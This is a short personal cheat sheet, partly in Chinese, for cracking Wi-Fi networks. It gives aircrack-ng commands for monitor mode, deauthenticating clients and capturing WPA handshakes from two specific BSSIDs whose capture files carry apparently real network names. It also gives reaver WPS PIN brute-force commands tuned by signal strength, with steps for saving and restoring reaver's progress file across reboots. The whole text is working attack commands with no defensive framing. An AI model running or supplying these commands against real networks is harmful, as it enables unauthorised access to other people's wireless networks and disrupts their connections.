1. airmon-ng start wlan0
2. airodump-ng wlan0mon 
3. next airodump-ng
4. aireplay-ng -0 10 -a target-mac -c client-mac wlan0mon0


airodump-ng -c 10 --bssid  28:D1:27:8C:6B:65 -w Xiaomi_DiDi wlan0mon (handshake)



airodump-ng -c 1 --bssid  48:0E:EC:50:97:E4 -w xiaokeai wlan0mon


reaver -i mon0 -b xx:xx:xx:xx:xx:xx -d 0 -vv -a -S -N

信号非常好:

reaver -i mon0 -b MAC -a -S -vv -d 0 -c 1

信号普通:

reaver -i mon0 -b MAC -a -S -vv -d .5 -t .5 -c 1

信号一般:

reaver -i mon0 -b MAC -a -S -vv -c 1

当出现有百分数时你就可以用crtl+c来暂停，它会将reaver的进度表文件保存在

1.3版：

/etc/reaver/MAC地址.wpc

1.4版：

/usr/local/etc/reaver/MAC地址.wpc

用资源管理器，手工将以MAC地址命名的、后辍为wpc的文件拷贝到U盘或硬盘中，

下次重启动后，再手工复制到/etc/reaver/ 目录下即可。